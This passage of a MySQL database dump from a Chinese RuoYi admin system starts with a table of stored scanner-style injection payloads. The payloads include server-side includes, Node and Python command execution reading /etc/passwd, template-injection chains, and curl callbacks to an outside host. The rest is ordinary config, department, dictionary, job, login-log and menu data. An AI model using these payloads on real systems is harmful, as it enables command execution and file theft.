12:34:54'),('null','',NULL,'\"-->\'-->`--><!--%23set%20var%3d\"tst1\"%20value%3d\"34382684ed470f4c\"--><!--%23set%20var%3d\"tst2\"%20value%3d\"d163e8f003c894dd\"--><!--%23echo%20var%3d\"tst1\"--><!--%23echo%20var%3d\"tst2\"-->','2021-10-09 12:34:55'),('null','',NULL,'require(\'child_process\').exec(\'cat /etc/passwd TST98b811237b284d65632fb71bfa716a02\',function(error,stdout,stderr){console.log(stdout)})','2021-10-09 12:34:55'),('null','',NULL,'require(\'child_process\').exec(\'curl tst2.qq.com/cmd_inject/e8ea255d71bdc21b7bb2dff74165f38e\',function(error,stdout,stderr){console.log(stdout)})','2021-10-09 12:34:57'),('null','',NULL,'require(\'child_process\').exec(\'curl tst2.qq.com/cmd_inject/e8ea255d71bdc21b7bb2dff74165f38e\',function(error,stdout,stderr){console.log(stdout)})','2021-10-09 12:34:57'),('null','',NULL,'require(\'child_process\').exec(\'cat /etc/passwd TST98b811237b284d65632fb71bfa716a02\',function(error,stdout,stderr){console.log(stdout)})','2021-10-09 12:34:57'),('null','',NULL,'{{\'\'.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[\'linecache\'].__dict__[\'os\'].popen(\'cat /etc/passwd TSTdc2c1de2288526ea9e73c5c0474c68e7\').read()}}','2021-10-09 12:34:58'),('null','',NULL,'{{\'\'.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[\'linecache\'].__dict__[\'os\'].popen(\'curl tst2.qq.com/cmd_inject/c4346ac056797a83f994c62d339b93fc\').read()}}','2021-10-09 12:34:58'),('null','',NULL,'__import__(\'os\').system(\'curl tst2.qq.com/cmd_inject/d514119d2a6bea73eab538720e119a5e\')','2021-10-09 12:34:59'),('null','',NULL,'__import__(\'os\').system(\'curl tst2.qq.com/cmd_inject/d514119d2a6bea73eab538720e119a5e\')','2021-10-09 12:35:00'),('null','',NULL,'{{\'\'.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[\'linecache\'].__dict__[\'os\'].popen(\'curl tst2.qq.com/cmd_inject/c4346ac056797a83f994c62d339b93fc\').read()}}','2021-10-09 12:35:00'),('null','',NULL,'__import__(\'os\').system(\'cat /etc/passwd TST4eed0e8d5cc4a6edbe96ddc34ec243ac\')','2021-10-09 12:35:01'),('null','',NULL,'__import__(\'os\').system(\'cat /etc/passwd TST4eed0e8d5cc4a6edbe96ddc34ec243ac\')','2021-10-09 12:35:01'),('null','',NULL,'{{\'\'.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[\'linecache\'].__dict__[\'os\'].popen(\'cat /etc/passwd TSTdc2c1de2288526ea9e73c5c0474c68e7\').read()}}','2021-10-09 12:35:01'),('null','',NULL,'${30.608654296908*30.608654296908}','2021-10-09 12:35:02'),('null','',NULL,'{48.981524199847*48.981524199847}','2021-10-09 12:35:04'),('null','',NULL,'<%=38.905146582894*38.905146582894%>','2021-10-09 12:35:04'),('null','',NULL,'{{=90.818436072974*90.818436072974}}','2021-10-09 12:35:05'),('null','',NULL,'<%=76.326576352669*76.326576352669%>','2021-10-09 12:35:05'),('null','',NULL,'{{24.450327058901*24.450327058901}}','2021-10-09 12:35:06'),('null','',NULL,'{20.191562138655*20.191562138655}','2021-10-09 12:35:06'),('null','',NULL,'#{12.052400291765*12.052400291765}','2021-10-09 12:35:07'),('null','',NULL,'#{59.580537671445*59.580537671445}','2021-10-09 12:35:08'),('null','',NULL,'${84.810011171246*84.810011171246}','2021-10-09 12:35:08'),('null','',NULL,'{{=48.590528935246*48.590528935246}}','2021-10-09 12:35:08'),('null','',NULL,'{{20.672209090224*20.672209090224}}','2021-10-09 12:35:09');
/*!40000 ALTER TABLE `suggest` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_config`
--

DROP TABLE IF EXISTS `sys_config`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_config` (
  `config_id` int(5) NOT NULL AUTO_INCREMENT COMMENT '参数主键',
  `config_name` varchar(100) DEFAULT '' COMMENT '参数名称',
  `config_key` varchar(100) DEFAULT '' COMMENT '参数键名',
  `config_value` varchar(500) DEFAULT '' COMMENT '参数键值',
  `config_type` char(1) DEFAULT 'N' COMMENT '系统内置（Y是 N否）',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`config_id`)
) ENGINE=InnoDB AUTO_INCREMENT=100 DEFAULT CHARSET=utf8 COMMENT='参数配置表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_config`
--

LOCK TABLES `sys_config` WRITE;
/*!40000 ALTER TABLE `sys_config` DISABLE KEYS */;
INSERT INTO `sys_config` VALUES (1,'主框架页-默认皮肤样式名称','sys.index.skinName','skin-blue','Y','admin','2022-01-05 13:37:34','',NULL,'蓝色 skin-blue、绿色 skin-green、紫色 skin-purple、红色 skin-red、黄色 skin-yellow'),(2,'用户管理-账号初始密码','sys.user.initPassword','123456','Y','admin','2022-01-05 13:37:34','',NULL,'初始化密码 123456'),(3,'主框架页-侧边栏主题','sys.index.sideTheme','theme-dark','Y','admin','2022-01-05 13:37:35','',NULL,'深黑主题theme-dark，浅色主题theme-light，深蓝主题theme-blue'),(4,'账号自助-是否开启用户注册功能','sys.account.registerUser','false','Y','admin','2022-01-05 13:37:35','',NULL,'是否开启注册用户功能（true开启，false关闭）'),(5,'用户管理-密码字符范围','sys.account.chrtype','0','Y','admin','2022-01-05 13:37:35','',NULL,'默认任意字符范围，0任意（密码可以输入任意字符），1数字（密码只能为0-9数字），2英文字母（密码只能为a-z和A-Z字母），3字母和数字（密码必须包含字母，数字）,4字母数字和特殊字符（目前支持的特殊字符包括：~!@#$%^&*()-=_+）'),(6,'用户管理-初始密码修改策略','sys.account.initPasswordModify','0','Y','admin','2022-01-05 13:37:35','',NULL,'0：初始密码修改策略关闭，没有任何提示，1：提醒用户，如果未修改初始密码，则在登录时就会提醒修改密码对话框'),(7,'用户管理-账号密码更新周期','sys.account.passwordValidateDays','0','Y','admin','2022-01-05 13:37:35','',NULL,'密码更新周期（填写数字，数据初始化值为0不限制，若修改必须为大于0小于365的正整数），如果超过这个周期登录系统时，则在登录时就会提醒修改密码对话框'),(8,'主框架页-菜单导航显示风格','sys.index.menuStyle','default','Y','admin','2022-01-05 13:37:35','',NULL,'菜单导航显示风格（default为左侧导航菜单，topnav为顶部导航菜单）'),(9,'主框架页-是否开启页脚','sys.index.ignoreFooter','true','Y','admin','2022-01-05 13:37:35','',NULL,'是否开启底部页脚显示（true显示，false隐藏）');
/*!40000 ALTER TABLE `sys_config` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_dept`
--

DROP TABLE IF EXISTS `sys_dept`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_dept` (
  `dept_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '部门id',
  `parent_id` bigint(20) DEFAULT '0' COMMENT '父部门id',
  `ancestors` varchar(50) DEFAULT '' COMMENT '祖级列表',
  `dept_name` varchar(30) DEFAULT '' COMMENT '部门名称',
  `order_num` int(4) DEFAULT '0' COMMENT '显示顺序',
  `leader` varchar(20) DEFAULT NULL COMMENT '负责人',
  `phone` varchar(11) DEFAULT NULL COMMENT '联系电话',
  `email` varchar(50) DEFAULT NULL COMMENT '邮箱',
  `status` char(1) DEFAULT '0' COMMENT '部门状态（0正常 1停用）',
  `del_flag` char(1) DEFAULT '0' COMMENT '删除标志（0代表存在 2代表删除）',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  PRIMARY KEY (`dept_id`)
) ENGINE=InnoDB AUTO_INCREMENT=200 DEFAULT CHARSET=utf8 COMMENT='部门表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_dept`
--

LOCK TABLES `sys_dept` WRITE;
/*!40000 ALTER TABLE `sys_dept` DISABLE KEYS */;
INSERT INTO `sys_dept` VALUES (100,0,'0','若依科技',0,'若依','15888888888','ry@qq.com','0','0','admin','2022-01-05 13:37:28','',NULL),(101,100,'0,100','深圳总公司',1,'若依','15888888888','ry@qq.com','0','0','admin','2022-01-05 13:37:28','',NULL),(102,100,'0,100','长沙分公司',2,'若依','15888888888','ry@qq.com','0','0','admin','2022-01-05 13:37:28','',NULL),(103,101,'0,100,101','研发部门',1,'若依','15888888888','ry@qq.com','0','0','admin','2022-01-05 13:37:28','',NULL),(104,101,'0,100,101','市场部门',2,'若依','15888888888','ry@qq.com','0','0','admin','2022-01-05 13:37:28','',NULL),(105,101,'0,100,101','测试部门',3,'若依','15888888888','ry@qq.com','0','0','admin','2022-01-05 13:37:28','',NULL),(106,101,'0,100,101','财务部门',4,'若依','15888888888','ry@qq.com','0','0','admin','2022-01-05 13:37:28','',NULL),(107,101,'0,100,101','运维部门',5,'若依','15888888888','ry@qq.com','0','0','admin','2022-01-05 13:37:28','',NULL),(108,102,'0,100,102','市场部门',1,'若依','15888888888','ry@qq.com','0','0','admin','2022-01-05 13:37:28','',NULL),(109,102,'0,100,102','财务部门',2,'若依','15888888888','ry@qq.com','0','0','admin','2022-01-05 13:37:28','',NULL);
/*!40000 ALTER TABLE `sys_dept` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_dict_data`
--

DROP TABLE IF EXISTS `sys_dict_data`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_dict_data` (
  `dict_code` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '字典编码',
  `dict_sort` int(4) DEFAULT '0' COMMENT '字典排序',
  `dict_label` varchar(100) DEFAULT '' COMMENT '字典标签',
  `dict_value` varchar(100) DEFAULT '' COMMENT '字典键值',
  `dict_type` varchar(100) DEFAULT '' COMMENT '字典类型',
  `css_class` varchar(100) DEFAULT NULL COMMENT '样式属性（其他样式扩展）',
  `list_class` varchar(100) DEFAULT NULL COMMENT '表格回显样式',
  `is_default` char(1) DEFAULT 'N' COMMENT '是否默认（Y是 N否）',
  `status` char(1) DEFAULT '0' COMMENT '状态（0正常 1停用）',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`dict_code`)
) ENGINE=InnoDB AUTO_INCREMENT=100 DEFAULT CHARSET=utf8 COMMENT='字典数据表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_dict_data`
--

LOCK TABLES `sys_dict_data` WRITE;
/*!40000 ALTER TABLE `sys_dict_data` DISABLE KEYS */;
INSERT INTO `sys_dict_data` VALUES (1,1,'男','0','sys_user_sex','','','Y','0','admin','2022-01-05 13:37:34','',NULL,'性别男'),(2,2,'女','1','sys_user_sex','','','N','0','admin','2022-01-05 13:37:34','',NULL,'性别女'),(3,3,'未知','2','sys_user_sex','','','N','0','admin','2022-01-05 13:37:34','',NULL,'性别未知'),(4,1,'显示','0','sys_show_hide','','primary','Y','0','admin','2022-01-05 13:37:34','',NULL,'显示菜单'),(5,2,'隐藏','1','sys_show_hide','','danger','N','0','admin','2022-01-05 13:37:34','',NULL,'隐藏菜单'),(6,1,'正常','0','sys_normal_disable','','primary','Y','0','admin','2022-01-05 13:37:34','',NULL,'正常状态'),(7,2,'停用','1','sys_normal_disable','','danger','N','0','admin','2022-01-05 13:37:34','',NULL,'停用状态'),(8,1,'正常','0','sys_job_status','','primary','Y','0','admin','2022-01-05 13:37:34','',NULL,'正常状态'),(9,2,'暂停','1','sys_job_status','','danger','N','0','admin','2022-01-05 13:37:34','',NULL,'停用状态'),(10,1,'默认','DEFAULT','sys_job_group','','','Y','0','admin','2022-01-05 13:37:34','',NULL,'默认分组'),(11,2,'系统','SYSTEM','sys_job_group','','','N','0','admin','2022-01-05 13:37:34','',NULL,'系统分组'),(12,1,'是','Y','sys_yes_no','','primary','Y','0','admin','2022-01-05 13:37:34','',NULL,'系统默认是'),(13,2,'否','N','sys_yes_no','','danger','N','0','admin','2022-01-05 13:37:34','',NULL,'系统默认否'),(14,1,'通知','1','sys_notice_type','','warning','Y','0','admin','2022-01-05 13:37:34','',NULL,'通知'),(15,2,'公告','2','sys_notice_type','','success','N','0','admin','2022-01-05 13:37:34','',NULL,'公告'),(16,1,'正常','0','sys_notice_status','','primary','Y','0','admin','2022-01-05 13:37:34','',NULL,'正常状态'),(17,2,'关闭','1','sys_notice_status','','danger','N','0','admin','2022-01-05 13:37:34','',NULL,'关闭状态'),(18,99,'其他','0','sys_oper_type','','info','N','0','admin','2022-01-05 13:37:34','',NULL,'其他操作'),(19,1,'新增','1','sys_oper_type','','info','N','0','admin','2022-01-05 13:37:34','',NULL,'新增操作'),(20,2,'修改','2','sys_oper_type','','info','N','0','admin','2022-01-05 13:37:34','',NULL,'修改操作'),(21,3,'删除','3','sys_oper_type','','danger','N','0','admin','2022-01-05 13:37:34','',NULL,'删除操作'),(22,4,'授权','4','sys_oper_type','','primary','N','0','admin','2022-01-05 13:37:34','',NULL,'授权操作'),(23,5,'导出','5','sys_oper_type','','warning','N','0','admin','2022-01-05 13:37:34','',NULL,'导出操作'),(24,6,'导入','6','sys_oper_type','','warning','N','0','admin','2022-01-05 13:37:34','',NULL,'导入操作'),(25,7,'强退','7','sys_oper_type','','danger','N','0','admin','2022-01-05 13:37:34','',NULL,'强退操作'),(26,8,'生成代码','8','sys_oper_type','','warning','N','0','admin','2022-01-05 13:37:34','',NULL,'生成操作'),(27,9,'清空数据','9','sys_oper_type','','danger','N','0','admin','2022-01-05 13:37:34','',NULL,'清空操作'),(28,1,'成功','0','sys_common_status','','primary','N','0','admin','2022-01-05 13:37:34','',NULL,'正常状态'),(29,2,'失败','1','sys_common_status','','danger','N','0','admin','2022-01-05 13:37:34','',NULL,'停用状态');
/*!40000 ALTER TABLE `sys_dict_data` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_dict_type`
--

DROP TABLE IF EXISTS `sys_dict_type`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_dict_type` (
  `dict_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '字典主键',
  `dict_name` varchar(100) DEFAULT '' COMMENT '字典名称',
  `dict_type` varchar(100) DEFAULT '' COMMENT '字典类型',
  `status` char(1) DEFAULT '0' COMMENT '状态（0正常 1停用）',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) DEFAULT NULL COMMENT '备注',
  PRIMARY KEY (`dict_id`),
  UNIQUE KEY `dict_type` (`dict_type`)
) ENGINE=InnoDB AUTO_INCREMENT=100 DEFAULT CHARSET=utf8 COMMENT='字典类型表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_dict_type`
--

LOCK TABLES `sys_dict_type` WRITE;
/*!40000 ALTER TABLE `sys_dict_type` DISABLE KEYS */;
INSERT INTO `sys_dict_type` VALUES (1,'用户性别','sys_user_sex','0','admin','2022-01-05 13:37:33','',NULL,'用户性别列表'),(2,'菜单状态','sys_show_hide','0','admin','2022-01-05 13:37:33','',NULL,'菜单状态列表'),(3,'系统开关','sys_normal_disable','0','admin','2022-01-05 13:37:33','',NULL,'系统开关列表'),(4,'任务状态','sys_job_status','0','admin','2022-01-05 13:37:33','',NULL,'任务状态列表'),(5,'任务分组','sys_job_group','0','admin','2022-01-05 13:37:33','',NULL,'任务分组列表'),(6,'系统是否','sys_yes_no','0','admin','2022-01-05 13:37:34','',NULL,'系统是否列表'),(7,'通知类型','sys_notice_type','0','admin','2022-01-05 13:37:34','',NULL,'通知类型列表'),(8,'通知状态','sys_notice_status','0','admin','2022-01-05 13:37:34','',NULL,'通知状态列表'),(9,'操作类型','sys_oper_type','0','admin','2022-01-05 13:37:34','',NULL,'操作类型列表'),(10,'系统状态','sys_common_status','0','admin','2022-01-05 13:37:34','',NULL,'登录状态列表');
/*!40000 ALTER TABLE `sys_dict_type` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_job`
--

DROP TABLE IF EXISTS `sys_job`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_job` (
  `job_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '任务ID',
  `job_name` varchar(64) NOT NULL DEFAULT '' COMMENT '任务名称',
  `job_group` varchar(64) NOT NULL DEFAULT 'DEFAULT' COMMENT '任务组名',
  `invoke_target` varchar(500) NOT NULL COMMENT '调用目标字符串',
  `cron_expression` varchar(255) DEFAULT '' COMMENT 'cron执行表达式',
  `misfire_policy` varchar(20) DEFAULT '3' COMMENT '计划执行错误策略（1立即执行 2执行一次 3放弃执行）',
  `concurrent` char(1) DEFAULT '1' COMMENT '是否并发执行（0允许 1禁止）',
  `status` char(1) DEFAULT '0' COMMENT '状态（0正常 1暂停）',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) DEFAULT '' COMMENT '备注信息',
  PRIMARY KEY (`job_id`,`job_name`,`job_group`)
) ENGINE=InnoDB AUTO_INCREMENT=100 DEFAULT CHARSET=utf8 COMMENT='定时任务调度表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_job`
--

LOCK TABLES `sys_job` WRITE;
/*!40000 ALTER TABLE `sys_job` DISABLE KEYS */;
INSERT INTO `sys_job` VALUES (1,'系统默认（无参）','DEFAULT','ryTask.ryNoParams','0/10 * * * * ?','3','1','1','admin','2022-01-05 13:37:35','',NULL,''),(2,'系统默认（有参）','DEFAULT','ryTask.ryParams(\'ry\')','0/15 * * * * ?','3','1','1','admin','2022-01-05 13:37:35','',NULL,''),(3,'系统默认（多参）','DEFAULT','ryTask.ryMultipleParams(\'ry\', true, 2000L, 316.50D, 100)','0/20 * * * * ?','3','1','1','admin','2022-01-05 13:37:35','',NULL,'');
/*!40000 ALTER TABLE `sys_job` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_job_log`
--

DROP TABLE IF EXISTS `sys_job_log`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_job_log` (
  `job_log_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '任务日志ID',
  `job_name` varchar(64) NOT NULL COMMENT '任务名称',
  `job_group` varchar(64) NOT NULL COMMENT '任务组名',
  `invoke_target` varchar(500) NOT NULL COMMENT '调用目标字符串',
  `job_message` varchar(500) DEFAULT NULL COMMENT '日志信息',
  `status` char(1) DEFAULT '0' COMMENT '执行状态（0正常 1失败）',
  `exception_info` varchar(2000) DEFAULT '' COMMENT '异常信息',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  PRIMARY KEY (`job_log_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='定时任务调度日志表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_job_log`
--

LOCK TABLES `sys_job_log` WRITE;
/*!40000 ALTER TABLE `sys_job_log` DISABLE KEYS */;
/*!40000 ALTER TABLE `sys_job_log` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_logininfor`
--

DROP TABLE IF EXISTS `sys_logininfor`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_logininfor` (
  `info_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '访问ID',
  `login_name` varchar(50) DEFAULT '' COMMENT '登录账号',
  `ipaddr` varchar(128) DEFAULT '' COMMENT '登录IP地址',
  `login_location` varchar(255) DEFAULT '' COMMENT '登录地点',
  `browser` varchar(50) DEFAULT '' COMMENT '浏览器类型',
  `os` varchar(50) DEFAULT '' COMMENT '操作系统',
  `status` char(1) DEFAULT '0' COMMENT '登录状态（0成功 1失败）',
  `msg` varchar(255) DEFAULT '' COMMENT '提示消息',
  `login_time` datetime DEFAULT NULL COMMENT '访问时间',
  PRIMARY KEY (`info_id`)
) ENGINE=InnoDB AUTO_INCREMENT=123 DEFAULT CHARSET=utf8 COMMENT='系统访问记录';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_logininfor`
--

LOCK TABLES `sys_logininfor` WRITE;
/*!40000 ALTER TABLE `sys_logininfor` DISABLE KEYS */;
INSERT INTO `sys_logininfor` VALUES (100,'admin','1.202.230.130','XX XX','Chrome 9','Windows 10','1','密码输入错误1次','2022-01-05 19:42:01'),(101,'admin','1.202.230.130','XX XX','Chrome 9','Windows 10','1','密码输入错误2次','2022-01-05 19:42:03'),(102,'admin','1.202.230.130','XX XX','Chrome 9','Windows 10','1','密码输入错误3次','2022-01-05 19:42:07'),(103,'admin','1.202.230.130','XX XX','Chrome 9','Windows 10','1','密码输入错误4次','2022-01-05 19:42:18'),(104,'admin','1.202.230.130','XX XX','Chrome 9','Windows 10','1','密码输入错误5次','2022-01-05 19:42:49'),(105,'admin','1.202.230.130','XX XX','Chrome 9','Windows 10','1','密码输入错误5次，帐户锁定10分钟','2022-01-05 19:44:43'),(106,'admin','1.202.230.130','XX XX','Chrome 9','Windows 10','1','密码输入错误5次，帐户锁定10分钟','2022-01-05 19:48:31'),(107,'ruoyi','1.202.230.130','XX XX','Chrome 9','Windows 10','1','用户不存在/密码错误','2022-01-05 19:52:27'),(108,'admin','127.0.0.1','内网IP','Chrome 9','Windows 10','0','登录成功','2022-01-05 19:57:50'),(109,'admin','127.0.0.1','内网IP','Chrome 9','Windows 10','0','登录成功','2022-01-05 19:58:22'),(110,'admin','1.202.230.130','XX XX','Chrome 9','Windows 10','0','登录成功','2022-01-05 20:00:45'),(111,'admin','1.202.230.130','XX XX','Chrome 9','Windows 10','0','登录成功','2022-01-05 22:43:37'),(112,'admin','1.202.230.130','XX XX','Chrome 9','Windows 10','0','登录成功','2022-01-05 23:59:58'),(113,'admin','45.207.38.192','XX XX','Chrome','Windows 10','0','登录成功','2022-01-15 00:09:04'),(114,'admin','124.237.14.129','XX XX','Chrome 9','Windows 10','0','登录成功','2022-01-15 16:40:46'),(115,'admin','60.9.190.155','XX XX','Chrome 9','Windows 10','0','登录成功','2022-02-03 15:12:52'),(116,'admin','122.233.93.82','XX XX','Chrome 9','Windows 10','0','登录成功','2022-02-10 16:57:16'),(117,'admin','123.232.102.156','XX XX','Chrome 9','Windows 10','0','登录成功','2022-02-13 08:23:53'),(118,'admin','172.105.219.82','XX XX','Chrome 8','Mac OS X','1','密码输入错误1次','2022-03-13 04:34:34'),(119,'admin','172.105.219.82','XX XX','Chrome 8','Mac OS X','1','密码输入错误2次','2022-03-13 04:34:34'),(120,'admin','172.105.219.82','XX XX','Chrome 8','Mac OS X','1','密码输入错误4次','2022-03-13 04:34:34'),(121,'admin','172.105.219.82','XX XX','Chrome 8','Mac OS X','1','密码输入错误3次','2022-03-13 04:34:34'),(122,'admin','124.126.96.184','XX XX','Chrome 10','Windows 10','0','登录成功','2022-04-04 22:22:49');
/*!40000 ALTER TABLE `sys_logininfor` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sys_menu`
--

DROP TABLE IF EXISTS `sys_menu`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sys_menu` (
  `menu_id` bigint(20) NOT NULL AUTO_INCREMENT COMMENT '菜单ID',
  `menu_name` varchar(50) NOT NULL COMMENT '菜单名称',
  `parent_id` bigint(20) DEFAULT '0' COMMENT '父菜单ID',
  `order_num` int(4) DEFAULT '0' COMMENT '显示顺序',
  `url` varchar(200) DEFAULT '#' COMMENT '请求地址',
  `target` varchar(20) DEFAULT '' COMMENT '打开方式（menuItem页签 menuBlank新窗口）',
  `menu_type` char(1) DEFAULT '' COMMENT '菜单类型（M目录 C菜单 F按钮）',
  `visible` char(1) DEFAULT '0' COMMENT '菜单状态（0显示 1隐藏）',
  `is_refresh` char(1) DEFAULT '1' COMMENT '是否刷新（0刷新 1不刷新）',
  `perms` varchar(100) DEFAULT NULL COMMENT '权限标识',
  `icon` varchar(100) DEFAULT '#' COMMENT '菜单图标',
  `create_by` varchar(64) DEFAULT '' COMMENT '创建者',
  `create_time` datetime DEFAULT NULL COMMENT '创建时间',
  `update_by` varchar(64) DEFAULT '' COMMENT '更新者',
  `update_time` datetime DEFAULT NULL COMMENT '更新时间',
  `remark` varchar(500) DEFAULT '' COMMENT '备注',
  PRIMARY KEY (`menu_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2063 DEFAULT CHARSET=utf8 COMMENT='菜单权限表';
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sys_menu`
--

LOCK TABLES `sys_menu` WRITE;
/*!40000 ALTER TABLE `sys_menu` DISABLE KEYS */;
INSERT INTO `sys_menu` VALUES (1,'系统管理',0,1,'#','menuItem','M','1','1','','fa fa-gear','admin','2022-01-05 13:37:29','admin','2022-04-04 22:46:02','系统管理目录'),(2,'系统监控',0,2,'#','menuItem','M','1','1','','fa fa-video-camera','admin','2022-01-05 13:37:29','admin','2022-04-04 22:44:36','系统监控目录'),(3,'系统工具',0,3,'#','menuItem','M','1','1','','fa fa-bars','admin','2022-01-05 13:37:29','admin','2022-04-04 22:44:29','系统工具目录'),(4,'若依官网',0,4,'http://ruoyi.vip','menuBlank','C','1','1','','fa fa-location-arrow','admin','2022-01-05 13:37:29','admin','2022-01-05 20:06:16','若依官网地址'),(100,'用户管理',1,1,'/system/user','','C','0','1','system:user:view','fa fa-user-o','admin','2022-01-05 13:37:29','',NULL,'用户管理菜单'),(101,'角色管理',1,2,'/system/role','','C','0','1','system:role:view','fa fa-user-secret','admin','2022-01-05 13:37:29','',NULL,'角色管理菜单'),(102,'菜单管理',1,3,'/system/menu','','C','0','1','system:menu:view','fa fa-th-list','admin','2022-01-05 13:37:29','',NULL,'菜单管理菜单'),(103,'部门管理',1,4,'/system/dept','','C','0','1','system:dept:view','fa fa-outdent','admin','2022-01-05 13:37:29','',NULL,'部门管理菜单'),(104,'岗位管理',1,5,'/system/post','','C','0','1','system:post:view','fa fa-address-card-o','admin','2022-01-05 13:37:29','',NULL,'岗位管理菜单'),(105,'字典管理',1,6,'/system/dict','','C','0','1','system:dict:view','fa fa-bookmark-o','admin','2022-01-05 13:37:29','',NULL,'字典管理菜单'),(106,'参数设置',1,7,'/system/config','','C','0','1','system:config:view','fa fa-sun-o','admin','2022-01-05 13:37:29','',NULL,'参数设置菜单'),(107,'通知公告',1,8,'/system/notice','','C','0','1','system:notice:view','fa fa-bullhorn','admin','2022-01-05 13:37:29','',NULL,'通知公告菜单'),(108,'日志管理',1,9,'#','','M','0','1','','fa fa-pencil-square-o','admin','2022-01-05 13:37:29','',NULL,'日志管理菜单'),(109,'在线用户',2,1,'/monitor/online','','C','0','1','monitor:online:view','fa fa-user-circle','admin','2022-01-05 13:37:29','',NULL,'在线用户菜单'),(110,'定时任务',2,2,'/monitor/job','','C','0','1','monitor:job:view','fa fa-tasks','admin','2022-01-05 13:37:29','',NULL,'定时任务菜单'),(111,'数据监控',2,3,'/monitor/data','','C','0','1','monitor:data:view','fa fa-bug','admin','2022-01-05 13:37:29','',NULL,'数据监控菜单'),(112,'服务监控',2,4,'/monitor/server','','C','0','1','monitor:server:view','fa fa-server','admin','2022-01-05 13:37:29','',NULL,'服务监控菜单'),(113,'缓存监控',2,5,'/monitor/cache','','C','0','1','monitor:cache:view','fa fa-cube','admin','2022-01-05 13:37:29','',NULL,'缓存监控菜单'),(114,'表单构建',3,1,'/tool/build','','C','0','1','tool:build:view','fa fa-wpforms','admin','2022-01-05 13:37:29','',NULL,'表单构建菜单'),(115,'代码生成',3,2,'/tool/gen','','C','0','1','tool:gen:view','fa fa-code','admin','2022-01-05 13:37:29','',NULL,'代码生成菜单'),(116,'系统接口',3,3,'/tool/swagger','','C','0','1','tool:swagger:view','fa fa-gg','admin','2022-01-05 13:37:29','',NULL,'系统接口菜单'),(500,'操作日志',108,1,'/monitor/operlog','','C','0','1','monitor:operlog:view','fa fa-address-book','admin','2022-01-05 13:37:29','',NULL,'操作日志菜单'),(501,'登录日志',108,2,'/monitor/logininfor','','C','0','1','monitor:logininfor:view','fa fa-file-image-o','admin','2022-01-05 13:37:29','',NULL,'登录日志菜单'),(1000,'用户查询',100,1,'#','','F','0','1','system:user:list','#','admin','2022-01-05 13:37:29','',NULL,''),(1001,'用户新增',100,2,'#','','F','0','1','system:user:add','#','admin','2022-01-05 